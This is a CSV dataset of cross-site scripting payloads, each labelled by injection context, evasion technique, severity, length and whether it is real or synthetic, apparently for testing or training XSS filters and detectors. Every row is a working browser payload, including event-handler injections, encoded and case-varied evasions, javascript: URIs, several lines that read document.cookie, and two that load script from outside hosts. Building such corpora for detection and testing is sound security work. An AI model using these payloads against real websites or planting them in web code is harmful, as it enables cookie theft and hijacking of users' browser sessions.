payload,context,technique,severity,length,source
%3Csvg onmouseover=confirm(document.domain)/%3E,tag_injection,synthetic,medium,47,synthetic
"<thead oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,98,real
"<colgroup onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</colgroup>",event_handler,none,medium,71,real
"<kbd onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</kbd>",event_handler,none,medium,68,real
"<hr onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</hr>",event_handler,none,medium,64,real
"<link onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</link>",event_handler,none,medium,61,real
"%27 ontoggle=prompt(String.fromCharCode(88,83,83)) %27",attribute_escape,synthetic,medium,54,synthetic
"<style>@keyframes slidein {}</style><progress style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></progress>",event_handler,none,medium,170,real
"<output onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</output>",event_handler,none,medium,65,real
"<style>@keyframes x{}</style><dt style=""animation-name:x"" onanimationstart=""alert(1)""></dt>",event_handler,none,medium,91,real
"<big ondblclick=""alert(1)"">AnonKryptiQuz</big>",event_handler,none,medium,46,real
%2522%3E%3C%69%6D%67%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%70%72%6F%6D%70%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29%3B%3E,generic,url_encoding,low,140,real
"<div draggable=""true"" contenteditable>drag me</div><object ondrop=alert(1) contenteditable>drop here</object>",event_handler,none,medium,109,real
"<a href=""javas\x04cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
"b=String.fromCharCode.apply(null,a);var c=[88,115,112,108,111,105,116];var d=String.fromCharCode.apply(null,c);window[b](d);})()</sCrIpT>",generic,encoding,low,137,real
"<style>@keyframes x{}</style><noframes style=""animation-name:x"" onwebkitanimationend=""alert(1)""></noframes>",event_handler,none,medium,107,real
<svg onload=\u0061lert(location.hash)/>,tag_injection,synthetic,medium,39,synthetic
<img src=x onerror=alert('AnonKryptiQuz')//,event_handler,none,medium,43,real
""" on&#101;rror=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,medium,57,synthetic
<bleh/ondragstart=&Tab;parent&Tab;['open']&Tab;&lpar;&rpar;%20draggable=True>dragme,event_handler,url_encoding,low,83,real
"<acronym onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</acronym>",event_handler,none,medium,75,real
%26%2302java%26%23115cript:alert(document.domain),dom_sink,url_encoding,medium,49,real
(A(%22onerror='alert%60123%60'AnonKryptiQuz))/,event_handler,url_encoding,low,46,real
"<style>@keyframes x{}</style><nobr style=""animation-name:x"" onanimationend=""alert(1)""></nobr>",event_handler,none,medium,93,real
"<progress onmouseover=""alert(1)"">AnonKryptiQuz</progress>",event_handler,none,medium,57,real
<script>//consol&#101;.log('XSS')</script>,script_injection,synthetic,medium,42,synthetic
"<style>:target {transform: rotate(180deg);}</style><select id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></select>",event_handler,none,medium,130,real
"<! foo=""[[[Inception]]""><x foo=""]foo><script>alert(1)</script>"">",script_injection,none,medium,64,real
<section id=x tabindex=1 onfocus=alert(1)></section>,event_handler,none,medium,52,real
"<q draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</q>",event_handler,none,medium,78,real
"<wbr draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</wbr>",event_handler,none,medium,84,real
%22 onbegin=confirm(1) %22,attribute_escape,synthetic,medium,26,synthetic
"<col onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</col>",event_handler,none,medium,59,real
"<data ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</data>",event_handler,none,medium,89,real
"<style>:target {color:red;}</style><area id=x style=""transition:color 1s"" ontransitionstart=alert(1)></area>",event_handler,none,medium,108,real
<svg onload=write()>,event_handler,none,low,20,real
"<ruby oncontextmenu=""alert(1)"">AnonKryptiQuz</ruby>",event_handler,none,medium,51,real
<x v-bind:a='_b.constructor`alert(1)`()'>,attribute_escape,none,medium,41,real
"<div ondblclick=""alert(1)"">AnonKryptiQuz</div>",event_handler,none,medium,46,real
&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;,generic,html_entity,medium,141,real
"<button onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</button>",event_handler,none,medium,74,real
"<style>@keyframes x{}</style><em style=""animation-name:x"" onanimationstart=""alert(1)""></em>",event_handler,none,medium,91,real
""" onmouseover=alert(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,medium,52,synthetic
"""><script+src=""https://ulogin.ru/token.php?callback=alert(1337)""></script>",script_injection,none,medium,74,real
"<select onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</select>",event_handler,none,medium,85,real
<content onfocusout=alert(1) tabindex=1 id=x></content><input autofocus>,event_handler,none,medium,72,real
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,tag_injection,url_encoding,low,130,real
"<multicol onmouseup=""alert(1)"">AnonKryptiQuz</multicol>",event_handler,none,medium,55,real
<footer onpointerdown=alert(1) style=display:block>AnonKryptiQuz</footer>,event_handler,none,medium,73,real
<td onfocusout=alert(1) tabindex=1 id=x></td><input autofocus>,event_handler,none,medium,62,real
<svg ontoggle=console.log(location.hash)/>,tag_injection,synthetic,medium,42,synthetic
"<style>:target {color: red;}</style><h1 id=x style=""transition:color 10s"" ontransitioncancel=print()></h1>",event_handler,none,low,106,real
"<bdi onmouseout=""alert(1)"">AnonKryptiQuz</bdi>",event_handler,none,medium,46,real
<svg onpointerover=alert(1) style=display:block>AnonKryptiQuz</svg>,event_handler,none,medium,67,real
"'""/><img src= x onerror='alert(document.domain)'>",event_handler,none,medium,49,real
javascript:console.log(1),js_uri,synthetic,medium,25,synthetic
"<svg onload=""javascript:alert(123)"" xmlns=""#""></svg>",event_handler,none,medium,52,real
<noscript onpointerover=alert(1) style=display:block>AnonKryptiQuz</noscript>,event_handler,none,medium,77,real
"<style>@keyframes x{}</style><small style=""animation-name:x"" onanimationend=""alert(1)""></small>",event_handler,none,medium,95,real
"<div id = ""x""></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>",script_injection,none,medium,87,real
<svg><ruby onload=alert(1)></ruby>,event_handler,none,medium,34,real
"<ul ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</ul>",event_handler,none,medium,85,real
"<image3 onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</image3>",event_handler,none,medium,85,real
"<video id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></video>",event_handler,none,medium,86,real
<nextid onpointerup=alert(1) style=display:block>AnonKryptiQuz</nextid>,event_handler,none,medium,71,real
%3Csvg ontoggle=console.log('XSS')/%3E,tag_injection,synthetic,medium,38,synthetic
""" ontoggl&#101;=prompt(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,medium,47,synthetic
%3Cscript%3E/x/alert(location.hash)%3C/script%3E,script_injection,synthetic,medium,48,synthetic
"<BR SIZE=""&{alert('AnonKryptiQuz')}"">",attribute_escape,case_variation,medium,37,real
"<style>:target {color: red;}</style><input2 id=x style=""transition:color 10s"" ontransitioncancel=print()></input2>",event_handler,none,low,114,real
"<iframe oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,100,real
""" oNtoGglE=cOnfIrm(doCumEnt.doMaiN) """,attribute_escape,synthetic,medium,37,synthetic
<a id=x tabindex=1 onbeforeactivate=alert(1)></a>,event_handler,none,medium,49,real
"<strike onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></strike>",event_handler,none,medium,285,real
"<svG oNerRor=coNfiRm(StrIng.frOmCHarCodE(88,83,83))/>",tag_injection,synthetic,medium,53,synthetic
"<script onReadyStateChange script onReadyStateChange=""javascript:javascript:alert(1921)""></script onReadyStateChange>",script_injection,none,medium,117,real
<caption id=x tabindex=1 onfocus=alert(1)></caption>,event_handler,none,medium,52,real
<svg onbegin=prompt('XSS')/>,tag_injection,synthetic,medium,28,synthetic
&amp;amp;amp;amp;lt;img src=1 onerror=alert(1)&amp;amp;amp;amp;gt;,event_handler,none,medium,66,real
<a onpointerdown=alert(1) style=display:block>AnonKryptiQuz</a>,event_handler,none,medium,63,real
"' oNmoUseOveR=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape,synthetic,medium,58,synthetic
%3Csvg onmouseover=alert(document.cookie)/%3E,tag_injection,synthetic,medium,45,synthetic
"""%3E%3Csvg onbegin=prompt(location.hash)%3E",tag_injection,synthetic,medium,43,synthetic
"<frameset onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</frameset>",event_handler,none,medium,89,real
<keygen onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</keygen>,event_handler,none,medium,78,real
"<style>@keyframes x{}</style><kbd style=""animation-name:x"" onanimationstart=""alert(1)""></kbd>",event_handler,none,medium,93,real
&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(&apos;XSS&apos;)&gt;&lt;/OBJECT&gt;,js_uri,none,medium,142,real
<style>//*{x:expression(alert(/xss/))}//<style></style>,generic,none,medium,55,real
"""><svg onbegin=console.log(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,58,synthetic
"<frameset onload=""alert('AnonKryptiQuz')""></frameset>",event_handler,none,medium,53,real
<svg onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,74,synthetic
"<center onmouseout=""alert(1)"">AnonKryptiQuz</center>",event_handler,none,medium,52,real
"<custom tags onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</custom tags>",event_handler,none,medium,84,real
"<bgsound onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</bgsound>",event_handler,none,medium,70,real
"<del onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</del>",event_handler,none,medium,67,real
"<style>@keyframes slidein {}</style><hr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></hr>",event_handler,none,medium,158,real
"<tr onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</tr>",event_handler,none,medium,66,real
alert(1);,generic,none,medium,9,real
"<command draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</command>",event_handler,none,medium,72,real
"'""`><script>/* *\x2Fjavascript:alert(8756)// */</script>",script_injection,comment_injection,medium,56,real
"<frame oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</frame>",event_handler,none,medium,62,real
' oNfoCus=alErt(doCumEnt.coOkiE) ',attribute_escape,synthetic,medium,34,synthetic
"<canvas onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></canvas>",event_handler,none,medium,285,real
"<style>@keyframes x{}</style><main style=""animation-name:x"" onwebkitanimationend=""alert(1)""></main>",event_handler,none,medium,99,real
"<strike draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</strike>",event_handler,none,medium,90,real
"<q oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,94,real
<svG oNerRor=alErt(loCatIon.haSh)/>,tag_injection,synthetic,medium,35,synthetic
' onmouseover=console.log('XSS') ',attribute_escape,synthetic,medium,34,synthetic
""" onmouseover=\u0061lert('XSS') """,attribute_escape,synthetic,medium,33,synthetic
"<script src=""data:&comma;alert(1)//",script_injection,none,medium,35,real
"<svg ontoggl&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,medium,68,synthetic
"""%3E%3Csvg onmouseover=console.log('XSS')%3E",tag_injection,synthetic,medium,44,synthetic
"<BGSOUND SRC=""javascript:alert('AnonKryptiQuz');"">",js_uri,case_variation,medium,50,real
"<abbr onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</abbr>",event_handler,none,medium,67,real
%22 onload=console.log(document.cookie) %22,attribute_escape,synthetic,medium,43,synthetic
<embed src=1 onerror=alert(1) type=image/gif>,event_handler,none,medium,45,real
%22 onclick=confirm(document.cookie) %22,attribute_escape,synthetic,medium,40,synthetic
"<acronym onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</acronym>",event_handler,none,medium,90,real
%22><svg onload=console.log(1)>,tag_injection,synthetic,medium,31,synthetic
"<caption onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</caption>",event_handler,none,medium,76,real
"&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\""xss\"" implementation=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\""&gt;&lt;xss&#58;xss&gt;AnonKryptiQuz&lt;/xss&#58;xss&gt;&lt;/HTML&gt;",generic,html_entity,low,187,real
<scRipT>cOnfIrm('XSS')</ScrIpt>,script_injection,synthetic,medium,31,synthetic
"<s oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</s>",event_handler,none,medium,65,real
%27 onerror=alert(document.cookie) %27,attribute_escape,synthetic,medium,38,synthetic
%22><svg onmouseover=console.log(1)>,tag_injection,synthetic,medium,36,synthetic
%3Csvg onclick=alert('XSS')/%3E,tag_injection,synthetic,medium,31,synthetic
<imG oNloAd=AleRt('XSS')/>,tag_injection,synthetic,medium,26,synthetic
""" onfocus=confirm(document.cookie) """,attribute_escape,synthetic,medium,36,synthetic
"setTimeout(""alert(document.domain)"",0)",dom_sink,synthetic,medium,38,synthetic
"""><img src=x onerror=(prompt(document.domain));>",event_handler,none,medium,48,real
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=confirm('XSS')>"")",dom_sink,synthetic,medium,67,synthetic
%27 onclick=alert(document.domain) %27,attribute_escape,synthetic,medium,38,synthetic
<svg onload=prompt(1)>,tag_injection,synthetic,medium,22,synthetic
"<canvas draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</canvas>",event_handler,none,medium,90,real
"<div draggable=""true"" contenteditable>drag me</div><code ondrop=alert(1) contenteditable style=display:block>drop here</code>",event_handler,none,medium,125,real
javascript&#58;alert(1);,generic,html_entity,medium,24,real
"""><svg on&#101;rror=prompt(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,50,synthetic
%3Csvg onload=console.log(location.hash)%3E,tag_injection,synthetic,medium,43,synthetic
"<b onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</b>",event_handler,none,medium,58,real
"<html onmousemove html onmousemove=""javascript:javascript:alert(2138)""></html onmousemove>",event_handler,none,medium,90,real
"""<div style=""background-image: url(x)"" onerror=prompt(document.domain);>",event_handler,none,medium,72,real
<iframe/onload=alert(/INJECTX/)>,event_handler,none,medium,32,real
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;,generic,html_entity,medium,45,real
<ul id=x tabindex=1 ondeactivate=alert(1)></ul><input id=y autofocus>,event_handler,none,medium,69,real
<dfn id=x tabindex=1 onbeforeactivate=alert(1)></dfn>,event_handler,none,medium,53,real
"<animatemotion oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,107,real
"<dir draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</dir>",event_handler,none,medium,84,real
"<audio onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</audio>",event_handler,none,medium,68,real
"<svg onmousedown=""alert(1)"">AnonKryptiQuz</svg>",event_handler,none,medium,47,real
<p onblur=alert(1) tabindex=1 id=x></p><input autofocus>,event_handler,none,medium,56,real
<script>/*/console.log(location.hash)</script>,script_injection,synthetic,medium,46,synthetic
"<style>@keyframes slidein {}</style><sub style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></sub>",event_handler,none,medium,160,real
